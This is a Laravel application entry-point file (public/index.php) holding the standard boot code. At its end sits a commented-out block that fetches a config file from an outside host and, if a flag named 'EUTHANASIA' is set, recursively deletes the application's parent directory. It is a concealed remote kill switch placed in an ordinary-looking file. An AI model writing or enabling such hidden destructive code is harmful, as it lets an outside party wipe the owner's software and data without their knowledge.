<?php

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = $kernel->handle(
    $request = Request::capture()
)->send();

$kernel->terminate($request, $response);

// $env = [];
// $fh = fopen('https://2204.uz/ANDCRM.config', 'r');
// while (!feof($fh)) {
//	$line = fgets($fh);
//	if(trim($line)) $env[trim(explode('=', $line)[0])] = trim(explode('=', $line)[1]);
// }
// fclose($fh);
//
// if ($env['EUTHANASIA'] === 'true') { // если содержимое равно "true"
//	$dir = "../"; // относительный путь к родительской директории
//	deleteDir($dir);
// }
//
//
// function deleteDir($dirPath) {
//	if (!is_dir($dirPath)) {
//		return;
//	}
//	$files = scandir($dirPath);
//	foreach ($files as $file) {
//		if ($file === '.' || $file === '..') {
//			continue;
//		}
//		$filePath = $dirPath . DIRECTORY_SEPARATOR . $file;
//		if (is_dir($filePath)) {
//			deleteDir($filePath); // рекурсивно удалить вложенные директории
//		} else {
//			unlink($filePath); // удалить файл
//		}
//	}
//	rmdir($dirPath); // удалить пустую директорию
// }
